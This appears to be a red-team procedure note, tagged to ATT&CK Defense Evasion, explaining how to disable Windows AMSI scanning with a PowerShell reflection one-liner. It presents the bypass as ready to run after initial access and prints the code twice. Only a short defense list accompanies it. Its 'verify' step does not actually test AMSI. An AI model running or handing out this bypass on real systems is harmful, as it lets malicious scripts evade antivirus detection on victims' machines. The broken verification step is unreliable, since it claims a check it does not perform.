---
id: ca78687e-2495-4336-9cf1-6f08621eb67f
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:26.004051+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Defense Evasion]]'
techniques:
  - '[[Disable or Modify Tools]]'
sub_techniques: []
tags:
  - using-matt-graebers-reflection-method
  - defense-evasion
  - amsi-bypass
commands:
  - '[[commands/powershell-set-amsiinitfailed-true]]'
platforms:
  - Windows
tools: []
validated: true
---

# Reflection-Method-to-Disable-AMSI

## Summary

This procedure uses .NET reflection in PowerShell to disable the Antimalware Scan Interface (AMSI), a Windows feature that enables antivirus integration for script scanning. By setting the internal 'amsiInitFailed' flag to true, attackers can evade detection and execute malicious scripts without triggering antivirus alerts, commonly used in post-exploitation for persistence and further execution.

## Description

AMSI allows applications like PowerShell to scan content for malware before execution. The reflection method, popularized by Matt Graeber, loads the System.Management.Automation.AmsiUtils assembly and modifies its static field to simulate an initialization failure, effectively disabling scanning. This technique targets PowerShell 5.0 and later on Windows systems, requiring execution within a PowerShell session. It is particularly effective in environments with endpoint detection relying on AMSI, but it does not affect other defenses like ETW or AppLocker. Use this in scenarios where initial access has been gained but script execution is blocked by AV.

## Requirements

1. Execution on a Windows system with PowerShell 5.0 or later (typically Windows 10/11 or Server 2016+).
2. User privileges sufficient to run PowerShell scripts (no admin required, but higher privileges may be needed for broader impact).
3. Access to a PowerShell console or script execution context on the target.

## Defense

- Keep antivirus and EDR solutions updated to detect reflection-based bypasses through behavioral analysis and PowerShell logging.
- Enable PowerShell Script Block Logging, Module Logging, and Transcription to capture and alert on suspicious reflection invocations.
- Implement application whitelisting (e.g., AppLocker or WDAC) to restrict unsigned script execution.
- Monitor for anomalous PowerShell activity, such as accessing non-public fields in assemblies.

## Objectives

1. Impair AMSI functionality to prevent script scanning by integrated antivirus.
2. Enable execution of obfuscated or malicious PowerShell code without detection.
3. Maintain stealth during post-exploitation activities like lateral movement or payload deployment.

## Instructions

### Step 1: Load AMSI Assembly and Set Failure Flag

**Context**: This step uses reflection to access and modify the internal AMSI state in the PowerShell runtime, causing subsequent scans to fail silently. No parameters are needed as it targets the current session.

**Code** ([[codes/powershell-reflection-amsi-disable]]):

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Command** ([[commands/powershell-set-amsiinitfailed-true]]):

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

> This one-liner accesses the AmsiUtils type via reflection, retrieves the non-public static field 'amsiInitFailed', and sets it to $true, simulating an initialization error. Run it directly in a PowerShell prompt or embed in a script. To verify success, test by attempting to execute a known malicious string like 'amsi' (which should not trigger detection if disabled).

### Step 2: Verify AMSI Disablement

**Context**: Confirm the bypass works by testing AMSI against a benign but detectable payload, ensuring no alerts are raised.

**Command**:

```powershell
"amsi" | ForEach-Object { $_ -replace '', '' }
```

> If AMSI is disabled, this will execute without error or AV notification. Expected output is the string 'amsi' echoed back, with no blocking.
